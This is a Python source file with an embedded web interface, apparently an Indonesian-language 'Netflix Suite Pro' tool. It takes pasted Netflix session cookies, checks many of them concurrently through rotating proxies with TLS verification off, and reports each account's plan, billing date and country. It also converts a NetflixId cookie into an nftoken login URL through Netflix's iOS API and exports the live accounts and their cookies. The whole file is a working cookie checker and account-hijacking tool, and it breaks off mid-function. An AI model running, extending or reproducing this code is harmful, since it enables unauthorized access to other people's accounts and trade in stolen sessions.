import http.server
import json
import os
import random
import re
import socketserver
import sqlite3
import threading
import time
import urllib.parse
from datetime import datetime
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

PORT = 8080
PROXIES_FILE = "netflix_proxies.txt"
DB_FILE = "netflix_suite.db"
API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")

COUNTRY_CODE_NAMES = {
    'AR': 'Argentina', 'AU': 'Australia', 'BR': 'Brazil', 'CA': 'Canada',
    'DE': 'Germany', 'ES': 'Spain', 'FR': 'France', 'GB': 'United Kingdom',
    'ID': 'Indonesia', 'IN': 'India', 'IT': 'Italy', 'JP': 'Japan',
    'KR': 'South Korea', 'MY': 'Malaysia', 'MX': 'Mexico', 'NL': 'Netherlands',
    'PH': 'Philippines', 'SG': 'Singapore', 'TH': 'Thailand', 'TR': 'Turkey',
    'US': 'United States', 'VN': 'Vietnam',
}

db_lock = threading.Lock()
healthy_proxies = []
proxy_lock = threading.Lock()

def init_db():
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                created_at TEXT,
                type TEXT,
                status TEXT,
                plan TEXT,
                billing TEXT,
                country TEXT,
                route TEXT,
                token_url TEXT,
                raw_cookie TEXT
            )
        ''')
        conn.commit()
        conn.close()

def save_history(entry_type, status, plan='', billing='', country='', route='', token_url='', raw_cookie=''):
    with db_lock:
        try:
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute('''
                INSERT INTO history (created_at, type, status, plan, billing, country, route, token_url, raw_cookie)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                entry_type,
                status,
                plan,
                billing,
                country,
                route,
                token_url,
                raw_cookie[:500]
            ))
            conn.commit()
            conn.close()
        except Exception:
            pass

def get_history(limit=50):
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('''
            SELECT id, created_at, type, status, plan, billing, country, route, token_url
            FROM history
            ORDER BY id DESC
            LIMIT ?
        ''', (limit,))
        rows = c.fetchall()
        conn.close()
        return [
            {
                "id": r[0], "created_at": r[1], "type": r[2], "status": r[3],
                "plan": r[4], "billing": r[5], "country": r[6], "route": r[7], "token_url": r[8]
            }
            for r in rows
        ]

def clear_history():
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute('DELETE FROM history')
        conn.commit()
        conn.close()

def load_proxies():
    if not os.path.exists(PROXIES_FILE):
        return []
    res = []
    with open(PROXIES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if not p or p.startswith("#"):
                continue
            parts = p.split(":")
            if len(parts) == 4:
                ip, port, user, pwd = parts
                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{user}:{pwd}@{ip}:{port}", "latency": 0})
            elif len(parts) == 2:
                ip, port = parts
                res.append({"raw": f"{ip}:{port}", "proxy": f"http://{ip}:{port}", "latency": 0})
    return res

def check_proxy_health(p):
    t0 = time.time()
    try:
        proxies = {"http": p["proxy"], "https": p["proxy"]}
        r = requests.get("https://www.netflix.com/favicon.ico", proxies=proxies, timeout=6, verify=False)
        if r.status_code in (200, 301, 302, 404):
            latency = int((time.time() - t0) * 1000)
            return True, latency
    except Exception:
        pass
    return False, 0

def proxy_health_worker():
    global healthy_proxies
    while True:
        all_p = load_proxies()
        good = []
        for p in all_p:
            ok, lat = check_proxy_health(p)
            if ok:
                p["latency"] = lat
                good.append(p)
        with proxy_lock:
            healthy_proxies = good if good else all_p
        time.sleep(300)

def get_random_proxy():
    global healthy_proxies
    with proxy_lock:
        pool = list(healthy_proxies) if healthy_proxies else load_proxies()
    if not pool:
        return None, None
    choice = random.choice(pool)
    lat_info = f" ({choice.get('latency', 0)}ms)" if choice.get("latency") else ""
    return {"http": choice["proxy"], "https": choice["proxy"]}, f"{choice['raw']}{lat_info}"

def extract_cookie_values(text):
    cookie_dict = {}
    if not text:
        return cookie_dict

    text = str(text).strip()
    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7:
            cookie_dict[parts[5]] = parts[6]

    try:
        data = json.loads(text)
    except Exception:
        data = None

    if isinstance(data, list):
        for c in data:
            if isinstance(c, dict):
                n, v = c.get("name"), c.get("value")
                if n in COOKIE_KEYS and isinstance(v, str):
                    cookie_dict[n] = urllib.parse.unquote(v) if "%" in v else v
    elif isinstance(data, dict):
        for k in COOKIE_KEYS:
            v = data.get(k)
            if isinstance(v, str):
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in COOKIE_KEYS:
        if k not in cookie_dict:
            m = re.search(rf"(?<!\w){re.escape(k)}=([^;,\s]+)", text)
            if m:
                v = m.group(1)
                cookie_dict[k] = urllib.parse.unquote(v) if "%" in v else v

    for k in list(cookie_dict.keys()):
        if isinstance(cookie_dict[k], str):
            cookie_dict[k] = cookie_dict[k].strip().rstrip('.')

    return cookie_dict

def normalize_country(code):
    if not code:
        return 'Unknown'
    c = str(code).strip().upper()
    if len(c) == 2 and c.isalpha():
        return f"{COUNTRY_CODE_NAMES.get(c, c)} ({c})"
    return c

def generate_nftoken(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    nid = cookies.get("NetflixId")
    if not nid:
        save_history("nftoken", "DEAD", raw_cookie=cookie_text)
        raise ValueError("Cookie NetflixId tidak ditemukan.")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={nid}"

    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

    res = requests.get(API_URL, params=QUERY_PARAMS, headers=headers, proxies=proxies, timeout=20, verify=False)
    res.raise_for_status()

    data = res.json()
    token_node = (
        (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_node.get("token")
    expires = token_node.get("expires")
    if not token:
        save_history("nftoken", "DEAD", route=route, raw_cookie=cookie_text)
        raise ValueError("Netflix tidak mengembalikan token. Cookie mati/invalid.")

    exp_str = "Unknown"
    if isinstance(expires, (int, float)):
        ts = expires // 1000 if len(str(int(expires))) == 13 else expires
        exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")

    token_url = f"https://netflix.com/?nftoken={token}"
    save_history("nftoken", "LIVE", route=route, token_url=token_url, raw_cookie=cookie_text)
    return token_url, exp_str, route

def check_netflix_membership(cookie_text, use_proxy=True):
    cookies = extract_cookie_values(cookie_text)
    if "NetflixId" not in cookies:
        save_history("checker", "DEAD", raw_cookie=cookie_text)
        return {"live": False, "reason": "Cookie NetflixId tidak ditemukan."}

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://www.netflix.com/browse',
    }

    proxies, proxy_label = get_random_proxy() if use_proxy else (None, None)
    route = f"Proxy ({proxy_label})" if proxy_label else "Direct"

    try:
        session = requests.Session()
        ck_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
        headers['Cookie'] = ck_header

        r = session.get(
            'https://www.netflix.com/account/membership',
            headers=headers,
            proxies=proxies,
            timeout=15,
            allow_redirects=True,
            verify=False
        )

        if "login" in r.url.lower() or r.status_code in (401, 403) or 'data-uia="login-page"' in r.text:
            save_history("checker", "DEAD", route=route, raw_cookie=cookie_text)
            return {"live": False, "reason": "Cookie Expired / Terlempar ke Login.", "route": route}

        html = r.text
        plan_detected = 'Live (Standard/Basic)'
        if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or 'Premium' in html:
            plan_detected = 'Premium 4K'
        else:
            plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
            if plan_match:
                plan_detected = plan_match.group(1).strip()

        date_match = re.search(
            r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
            html, re.DOTALL | re.I
        )
        billing = date_match.group(1).strip() if date_match else 'N/A'

        country_match = re.search(r'"(?:countryOfSignup|currentCountry|memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
        country = normalize_country(country_match.group(1)) if country_match else 'Unknown'

        editor_cookies = [
            {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
            for k, v in cookies.items()
        ]

        save_history("checker", "LIVE", plan=plan_detected, billing=billing, country=country, route=route, raw_cookie=cookie_text)

        return {
            "live": True,
            "plan": plan_detected,
            "billing": billing,
            "country": country,
            "cookies": editor_cookies,
            "route": route
        }
    except Exception as e:
        save_history("checker", "ERROR", route=route, raw_cookie=cookie_text)
        return {"live": False, "reason": f"Request gagal: {str(e)}", "route": route}

HTML = """<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Netflix Suite Pro — NFToken, Bulk Concurrent & Monitor</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
:root {
  --bg-main: #0c0d10;
  --bg-card: #15171e;
  --bg-input: #090a0d;
  --border: #262934;
  --primary: #e50914;
  --primary-hover: #f40612;
  --text-main: #f1f3f7;
  --text-muted: #8b92a5;
  --green: #22c55e;
  --green-bg: rgba(34, 197, 94, 0.1);
  --red: #ef4444;
  --red-bg: rgba(239, 68, 68, 0.1);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Inter', system-ui, -apple-system, sans-serif;
  background-color: var(--bg-main);
  color: var(--text-main);
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 30px 16px;
}
.container {
  width: 100%;
  max-width: 880px;
  background-color: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 14px;
  padding: 28px;
  box-shadow: 0 20px 40px rgba(0,0,0,0.6);
}
.header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 24px;
  border-bottom: 1px solid var(--border);
  padding-bottom: 18px;
  flex-wrap: wrap;
  gap: 12px;
}
.brand { display: flex; align-items: center; gap: 12px; }
.brand h1 { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
.brand span { color: var(--primary); }
.badge {
  font-size: 11px;
  font-weight: 600;
  background: #232733;
  color: var(--text-muted);
  padding: 4px 8px;
  border-radius: 6px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
.tabs {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 8px;
  background: var(--bg-input);
  padding: 4px;
  border-radius: 10px;
  margin-bottom: 20px;
  border: 1px solid var(--border);
}
.tab-btn {
  padding: 10px;
  border: 0;
  background: transparent;
  color: var(--text-muted);
  font-weight: 600;
  font-size: 13px;
  border-radius: 7px;
  cursor: pointer;
  transition: all 0.2s;
  text-align: center;
}
.tab-btn.active { background: var(--bg-card); color: var(--text-main); box-shadow: 0 2px 8px rgba(0,0,0,0.4); }
.proxy-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(255,255,255,0.02);
  border: 1px solid var(--border);
  padding: 10px 14px;
  border-radius: 8px;
  margin-bottom: 20px;
  font-size: 13px;
  flex-wrap: wrap;
  gap: 10px;
}
.toggle-wrap { display: flex; align-items: center; gap: 8px; cursor: pointer; user-select: none; }
.toggle-wrap input { accent-color: var(--primary); cursor: pointer; }
.section-panel { display: none; }
.section-panel.active { display: block; }
label { display: block; font-size: 13px; font-weight: 500; color: var(--text-muted); margin-bottom: 8px; }
textarea {
  width: 100%;
  height: 140px;
  background: var(--bg-input);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px;
  color: #fff;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  resize: vertical;
  margin-bottom: 16px;
}
textarea:focus { outline: none; border-color: var(--primary); }
.btn-primary {
  width: 100%;
  padding: 12px;
  background: var(--primary);
  color: #fff;
  border: 0;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 8px;
}
.btn-primary:hover { background: var(--primary-hover); }
.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
.btn-secondary {
  padding: 8px 14px;
  background: #232733;
  color: var(--text-main);
  border: 1px solid var(--border);
  border-radius: 6px;
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
}
.btn-secondary:hover { background: #2d3242; }
.card-out {
  margin-top: 20px;
  border-radius: 10px;
  padding: 16px;
  border: 1px solid;
  font-size: 13px;
  display: none;
}
.card-out.live { background: var(--green-bg); border-color: var(--green); }
.card-out.dead { background: var(--red-bg); border-color: var(--red); }
.grid-meta {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
  gap: 12px;
  margin: 12px 0;
}
.meta-box {
  background: rgba(0,0,0,0.3);
  padding: 10px;
  border-radius: 6px;
  border: 1px solid rgba(255,255,255,0.05);
}
.meta-box span { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 2px; }
.meta-box strong { font-size: 14px; color: #fff; }
.token-link {
  word-break: break-all;
  background: rgba(0,0,0,0.4);
  padding: 10px;
  border-radius: 6px;
  font-family: 'JetBrains Mono', monospace;
  margin-top: 8px;
  border: 1px dashed rgba(255,255,255,0.15);
}
.token-link a { color: #60a5fa; text-decoration: none; }
.token-link a:hover { text-decoration: underline; }
.action-row { display: flex; gap: 8px; margin-top: 12px; }
.progress-wrap { margin-top: 16px; display: none; }
.progress-bar-bg { width: 100%; height: 8px; background: #232733; border-radius: 4px; overflow: hidden; margin-top: 6px; }
.progress-bar-fill { height: 100%; width: 0%; background: var(--primary); transition: width 0.2s; }
.bulk-stats { display: flex; gap: 14px; font-size: 13px; margin: 12px 0; font-weight: 600; flex-wrap: wrap; }
.table-wrap { overflow-x: auto; margin-top: 14px; max-height: 400px; }
table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: left; }
th, td { padding: 10px; border-bottom: 1px solid var(--border); }
th { background: #1a1d26; color: var(--text-muted); font-weight: 600; position: sticky; top: 0; }
tr:hover { background: rgba(255,255,255,0.02); }
.tag-live { color: var(--green); font-weight: 600; }
.tag-dead { color: var(--red); font-weight: 600; }
.shortcut-hint { font-size: 11px; color: var(--text-muted); margin-top: 6px; text-align: right; }
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <div class="brand">
      <h1>Netflix <span>Suite Pro</span></h1>
      <span class="badge">v4.0 Concurrent</span>
    </div>
    <div style="font-size:12px; color:var(--text-muted);">Docker & Concurrency Ready</div>
  </div>

  <div class="tabs">
    <button class="tab-btn active" onclick="switchTab('single')">Single Check / NFToken</button>
    <button class="tab-btn" onclick="switchTab('bulk')">Concurrent Bulk</button>
    <button class="tab-btn" onclick="switchTab('history')">History Database</button>
  </div>

  <div class="proxy-bar">
    <div class="toggle-wrap" onclick="document.getElementById('proxy-toggle').click()">
      <input type="checkbox" id="proxy-toggle" checked onclick="event.stopPropagation()">
      <span>Rotasi Proxy (Auto Health-Check)</span>
    </div>
    <div style="display:flex; align-items:center; gap:12px;">
      <div class="toggle-wrap" onclick="document.getElementById('sound-toggle').click()">
        <input type="checkbox" id="sound-toggle" checked onclick="event.stopPropagation()">
        <span>Sound Alert</span>
      </div>
      <span id="proxy-count-label" style="color:var(--text-muted)">Memuat proxy...</span>
    </div>
  </div>

  <!-- PANEL 1: SINGLE -->
  <div id="panel-single" class="section-panel active">
    <div style="display:flex; gap:10px; margin-bottom:12px;">
      <label style="cursor:pointer;"><input type="radio" name="single-mode" value="nftoken" checked onchange="toggleSingleMode()"> Mode: NFToken URL</label>
      <label style="cursor:pointer;"><input type="radio" name="single-mode" value="checker" onchange="toggleSingleMode()"> Mode: Membership Checker</label>
    </div>
    <textarea id="single-cookie" placeholder="Paste cookie di sini (Raw, JSON, Netscape)..."></textarea>
    <div class="shortcut-hint">Tekan <strong>Ctrl + Enter</strong> untuk generate / check langsung</div>
    <button id="single-btn" class="btn-primary" onclick="runSingle()" style="margin-top:10px;">
      <span id="single-btn-text">Generate NFToken</span>
    </button>
    <div id="single-out" class="card-out"></div>
  </div>

  <!-- PANEL 2: BULK -->
  <div id="panel-bulk" class="section-panel">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
      <label style="margin-bottom:0;">Multi-line cookies (1 baris = 1 akun):</label>
      <div style="font-size:12px; color:var(--text-muted); display:flex; align-items:center; gap:6px;">
        <span>Threads:</span>
        <select id="bulk-threads" style="background:#090a0d; color:#fff; border:1px solid var(--border); border-radius:4px; padding:2px 6px;">
          <option value="3">3 Concurrent</option>
          <option value="5" selected>5 Concurrent</option>
          <option value="10">10 Concurrent</option>
        </select>
      </div>
    </div>
    <textarea id="bulk-input" style="height:170px;" placeholder="NetflixId=...&#10;NetflixId=...; SecureNetflixId=...&#10;user:pass | Cookie = NetflixId=..."></textarea>
    <div class="shortcut-hint">Tekan <strong>Ctrl + Enter</strong> untuk start bulk | <strong>Esc</strong> untuk stop</div>
    <div style="display:flex; gap:8px; margin: 10px 0 12px;">
      <button id="bulk-btn" class="btn-primary" style="flex:2;" onclick="runBulk()">Mulai Concurrent Check</button>
      <button class="btn-secondary" style="flex:1;" onclick="stopBulk()">Stop</button>
    </div>
    <div id="bulk-progress" class="progress-wrap">
      <div style="display:flex; justify-content:space-between; font-size:12px;">
        <span id="progress-status">Memeriksa 0/0...</span>
        <span id="progress-percent">0%</span>
      </div>
      <div class="progress-bar-bg"><div id="progress-fill" class="progress-bar-fill"></div></div>
    </div>
    <div class="bulk-stats">
      <span>Total: <span id="stat-total">0</span></span>
      <span style="color:var(--green)">Live: <span id="stat-live">0</span></span>
      <span style="color:#60a5fa">4K: <span id="stat-4k">0</span></span>
      <span style="color:var(--red)">Dead: <span id="stat-dead">0</span></span>
    </div>
    <div class="action-row">
      <button class="btn-secondary" onclick="exportBulk('txt')">Export Live (TXT)</button>
      <button class="btn-secondary" onclick="exportBulk('json')">Export Live (JSON)</button>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>#</th><th>Status</th><th>Plan</th><th>Billing</th><th>Country</th><th>Route</th></tr>
        </thead>
        <tbody id="bulk-tbody"></tbody>
      </table>
    </div>
  </div>

  <!-- PANEL 3: HISTORY -->
  <div id="panel-history" class="section-panel">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
      <span style="font-size:13px; color:var(--text-muted);">Riwayat tersimpan di SQLite lokal (netflix_suite.db)</span>
      <div style="display:flex; gap:8px;">
        <button class="btn-secondary" onclick="loadHistory()">Refresh</button>
        <button class="btn-secondary" style="color:var(--red)" onclick="clearDbHistory()">Hapus Semua</button>
      </div>
    </div>
    <div class="table-wrap">
      <table>
        <thead>
          <tr><th>Waktu</th><th>Tipe</th><th>Status</th><th>Plan</th><th>Billing</th><th>Country</th><th>Aksi</th></tr>
        </thead>
        <tbody id="history-tbody"></tbody>
      </table>
    </div>
  </div>
</div>

<script>
let bulkRunning = false;
let bulkResults = [];

// Audio alert synthesiser
function playAlert(type) {
  if (!document.getElementById('sound-toggle').checked) return;
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    if (type === '4k') {
      osc.frequency.setValueAtTime(880, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(1760, ctx.currentTime + 0.15);
    } else {
      osc.frequency.setValueAtTime(587.33, ctx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.12);
    }
    gain.gain.setValueAtTime(0.15, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
    osc.start();
    osc.stop(ctx.currentTime + 0.25);
  } catch(e) {}
}

function notifyBrowser(title, body) {
  if ("Notification" in window && Notification.permission === "granted") {
    new Notification(title, { body });
  }
}

if ("Notification" in window && Notification.permission !== "denied") {
  Notification.requestPermission();
}

// Shortcuts
document.addEventListener('keydown', (e) => {
  if (e.ctrlKey && e.key === 'Enter') {
    const activeTab = document.querySelector('.section-panel.active').id;
    if (activeTab === 'panel-single') runSingle();
    if (activeTab === 'panel-bulk') runBulk();
  } else if (e.key === 'Escape') {
    stopBulk();
  }
});

function switchTab(tab) {
  document.querySelectorAll('.tab-btn').forEach((b, i) => {
    b.classList.toggle('active', (i === 0 && tab === 'single') || (i === 1 && tab === 'bulk') || (i === 2 && tab === 'history'));
  });
  document.getElementById('panel-single').classList.toggle('active', tab === 'single');
  document.getElementById('panel-bulk').classList.toggle('active', tab === 'bulk');
  document.getElementById('panel-history').classList.toggle('active', tab === 'history');
  if (tab === 'history') loadHistory();
}

function toggleSingleMode() {
  const m = document.querySelector('input[name="single-mode"]:checked').value;
  document.getElementById('single-btn-text').innerText = m === 'nftoken' ? 'Generate NFToken' : 'Check Status Akun';
}

async function fetchStats() {
  try {
    const res = await fetch('/api/proxies');
    const d = await res.json();
    document.getElementById('proxy-count-label').innerText = `${d.healthy}/${d.total} Proxy Healthy`;
  } catch(e) {}
}

async function runSingle() {
  const mode = document.querySelector('input[name="single-mode"]:checked').value;
  const cookie = document.getElementById('single-cookie').value.trim();
  const use_proxy = document.getElementById('proxy-toggle').checked;
  const out = document.getElementById('single-out');
  const btn = document.getElementById('single-btn');

  if (!cookie) { alert('Masukkan cookie terlebih dahulu'); return; }

  btn.disabled = true;
  out.style.display = 'none';

  try {
    const endpoint = mode === 'nftoken' ? '/api/token' : '/api/check';
    const res = await fetch(endpoint, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({cookie, use_proxy})
    });
    const d = await res.json();

    if (mode === 'nftoken') {
      if (d.error) throw new Error(d.error);
      playAlert('live');
      out.className = 'card-out live';
      out.innerHTML = `
        <strong>Login NFToken Berhasil:</strong>
        <div class="token-link"><a href="${d.url}" target="_blank">${d.url}</a></div>
        <div class="grid-meta">
          <div class="meta-box"><span>Expired</span><strong>${d.expires}</strong></div>
          <div class="meta-box"><span>Route</span><strong>${d.route}</strong></div>
        </div>
        <div class="action-row"><button class="btn-secondary" onclick="copyText('${d.url}')">Salin URL</button></div>
      `;
    } else {
      if (!d.live) throw new Error(d.reason || 'Akun Dead');
      if (d.plan.includes('4K')) playAlert('4k'); else playAlert('live');
      out.className = 'card-out live';
      out.innerHTML = `
        <strong>Akun Live Valid:</strong>
        <div class="grid-meta">
          <div class="meta-box"><span>Plan</span><strong>${d.plan}</strong></div>
          <div class="meta-box"><span>Next Billing</span><strong>${d.billing}</strong></div>
          <div class="meta-box"><span>Country</span><strong>${d.country}</strong></div>
          <div class="meta-box"><span>Route</span><strong>${d.route}</strong></div>
        </div>
        <div class="action-row"><button class="btn-secondary" onclick="copyJson(${JSON.stringify(d.cookies).replace(/"/g, '&quot;')})">Salin Cookie JSON</button></div>
      `;
    }
    out.style.display = 'block';
  } catch(e) {
    out.className = 'card-out dead';
    out.innerHTML = `<strong>Gagal:</strong> <div>${e.message}</div>`;
    out.style.display = 'block';
  } finally {
    btn.disabled = false;
  }
}

async function runBulk() {
  const text = document.getElementById('bulk-input').value.trim();
  if (!text) { alert('Isi baris cookie terlebih dahulu'); return; }
  const lines = text.split('\\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
  if (lines.length === 0) return;

  const use_proxy = document.getElementById('proxy-toggle').checked;
  const concurrency = parseInt(document.getElementById('bulk-threads').value, 10) || 5;

  bulkRunning = true;
  bulkResults = [];
  document.getElementById('bulk-btn').disabled = true;
  document.getElementById('bulk-progress').style.display = 'block';
  document.getElementById('bulk-tbody').innerHTML = '';

  let live = 0, fourk = 0, dead = 0, completed = 0;
  document.getElementById('stat-total').innerText = lines.length;

  // Concurrent worker queue
  let currentIndex = 0;

  async function worker() {
    while (currentIndex < lines.length && bulkRunning) {
      const idx = currentIndex++;
      const line = lines[idx];

      try {
        const res = await fetch('/api/check', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({cookie: line, use_proxy})
        });
        const d = await res.json();
        const item = { index: idx + 1, raw: line, ...d };
        bulkResults.push(item);

        if (d.live) {
          live++;
          if (d.plan && d.plan.includes('4K')) {
            fourk++;
            playAlert('4k');
          } else {
            playAlert('live');
          }
        } else {
          dead++;
        }
        appendBulkRow(item);
      } catch(e) {
        dead++;
        appendBulkRow({ index: idx + 1, live: false, plan: 'Error', billing: '-', country: '-', route: '-' });
      }

      completed++;
      const pct = Math.round((completed / lines.length) * 100);
      document.getElementById('progress-status').innerText = `Memeriksa ${completed}/${lines.length}...`;
      document.getElementById('progress-percent').innerText = `${pct}%`;
      document.getElementById('progress-fill').style.width = `${pct}%`;

      document.getElementById('stat-live').innerText = live;
      document.getElementById('stat-4k').innerText = fourk;
      document.getElementById('stat-dead').innerText = dead;
    }
  }

  const workers = Array.from({ length: Math.min(concurrency, lines.length) }, () => worker());
  await Promise.all(workers);

  bulkRunning = false;
  document.getElementById('bulk-btn').disabled = false;
  notifyBrowser('Bulk Check Selesai', `Total: ${lines.length} | Live: ${live} | 4K: ${fourk}`);
}

function stopBulk() { bulkRunning = false; }

function appendBulkRow(item) {
  const tbody = document.getElementById('bulk-tbody');
  const tr = document.createElement('tr');
  tr.innerHTML = `
    <td>${item.index}</td>
    <td class="${item.live ? 'tag-live' : 'tag-dead'}">${item.live ? 'LIVE' : 'DEAD'}</td>
    <td>${item.plan || '-'}</td>
    <td>${item.billing || '-'}</td>
    <td>${item.country || '-'}</td>
    <td style="color:var(--text-muted)">${item.route || 'Direct'}</td>
  `;
  tbody.prepend(tr);
}

function exportBulk(type) {
  const lives = bulkResults.filter(r => r.live);
  if (lives.length === 0) { alert('Belum ada akun LIVE'); return; }

  let blob, filename;
  if (type === 'txt') {
